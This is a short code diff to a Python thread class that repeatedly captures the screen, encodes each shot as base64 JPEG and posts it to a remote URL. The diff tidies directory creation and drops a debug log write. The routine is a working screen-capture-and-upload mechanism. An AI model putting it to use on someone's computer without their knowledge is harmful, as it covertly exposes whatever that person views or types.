@@ -1,4 +1,4 @@
-﻿# -*- coding: utf-8 -*-
+﻿  # -*- coding: utf-8 -*-
 
 import sys
 import os
@@ -26,10 +26,7 @@ class Screenshoter(threading.Thread):
         self.quality = 30        
         self.active = False 
         
-        try:
-            os.makedirs(self.datadir)
-        except:
-            pass       
+        defines.makedirs(self.datadir)      
         
         
     def signal_term(self, signum, frame):
@@ -46,12 +43,11 @@ class Screenshoter(threading.Thread):
         self.active = True
         while self.active:
             try:
+                defines.makedirs(self.datadir)
                 img = ImageGrab.grab()        
                 with closing(cStringIO.StringIO()) as fp:       
                     img.save(fp, "JPEG", quality=self.quality) 
-                    text = defines.GET(self.url, post='data={0}'.format(base64.urlsafe_b64encode(fp.getvalue())))
-                    with open('t:\capture.log', 'w') as flog:
-                        flog.write(text)
+                    text = defines.GET(self.url, post='data={0}'.format(base64.urlsafe_b64encode(fp.getvalue())))                    
             
             except Exception as e:
                 log.exception(e)
